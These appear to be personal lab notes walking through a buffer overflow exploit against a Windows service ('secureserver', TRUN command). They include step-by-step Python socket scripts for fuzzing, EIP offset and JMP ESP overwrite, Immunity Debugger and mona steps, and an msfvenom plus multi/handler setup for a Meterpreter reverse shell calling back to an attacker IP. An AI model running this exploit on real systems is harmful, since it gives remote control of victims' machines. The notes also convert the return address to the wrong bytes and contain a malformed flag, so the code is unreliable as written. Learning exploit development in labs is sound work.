On linux: strings, file, then do static and dynamic analysis

'''
#!/usr/bin/env python
import socket
buf = " "
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ##Creating socket,IPv4
s.connect(("192.168.65.10",9999)) ## define host and port 
print s.recv(1024) #print response to screen
s.send(buf) ## send variable buf
print s.recv(1024) ## print response to screen
s.close() ## closes socket
---
run to see connectivity of port

#!/usr/bin/env python
import socket
buf = "TRUN /.:/"
buf += "A" * 5000
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ##Creating socket,IPv4
s.connect(("192.168.65.10",9999)) ## define host and port
print s.recv(1024) #print response to screen
s.send(buf) ## send variable buf
print s.recv(1024) ## print response to screen
s.close() ## closes socket
'''
---
run immunity debugger as admin
file, attach secureserver, make sure it is running by clicking the play button, then send the python script
then send 5000 As to overflow it and then calculate the offset using wiremask.eu

#!/usr/bin/env python
import socket
buf = "TRUN /.:/"
buf += "A" * 2003
buf += "BBBB"
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ##Creating socket,IPv4
s.connect(("192.168.65.10",9999)) ## define host and port
print s.recv(1024) #print response to screen
s.send(buf) ## send variable buf
print s.recv(1024) ## print response to screen
s.close() ## closes socket
---
allows us go get 42424242 as eip

input !mona modules
--allows us to view what dlls where called on
!mona jmp -r esp -m "essfunc.dll"
--go to window<2:LogData
copy to clipboard address
625011AF

#!/usr/bin/env python
import socket
buf = "TRUN /.:/"
buf += "A" * 2003
buf+= "\xaf\x11\x50\x52"
buf += "\x90" * 15
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ##Creating socket,IPv4
s.connect(("192.168.65.10",9999)) ## define host and port
print s.recv(1024) #print response to screen
s.send(buf) ## send variable buf
print s.recv(1024) ## print response to screen
s.close() ## closes socket
##625011AF -> "\xaf\x11\x50\x52"
---
##msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.29.245 -lport=4444 -b "\x00" -f python
---
copy everthing except the first line
launch msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444

should get a meterpreter shell decently quickly





















































































